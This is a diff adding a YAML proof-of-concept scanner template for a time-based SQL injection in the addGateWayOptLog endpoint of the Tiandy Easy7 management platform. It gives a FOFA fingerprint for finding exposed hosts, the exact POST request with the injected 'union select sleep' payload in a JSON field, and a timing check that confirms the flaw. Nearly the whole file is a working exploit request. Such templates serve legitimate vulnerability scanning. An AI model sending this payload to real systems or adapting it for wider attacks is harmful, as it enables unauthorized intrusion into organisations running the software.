@@ -1,0 +1,21 @@
+id: poc-yaml-tiandy-easy7-imp-addgatewayoptlog-sqli
+info:
+  name: 天地伟业Easy7综合管理平台 addGateWayOptLog SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: Easy7综合管理平台
+  fofa: app="Tiandy-Easy7"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /Easy7/rest/log/addGateWayOptLog
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: gateLog={"gateLogList":[{"ch_code":"1'union select sleep({{.t1}})--+","ch_caption":"1","dt_time":"1"}]}
+  expression: status_code == 200 && contains(body,"\"ret\":") && contains(body,"\"content\":")
+    && contains(body,"\"count\":") && !contains(body,"<") && duration > t1 && duration
+    < t2
+transport: http
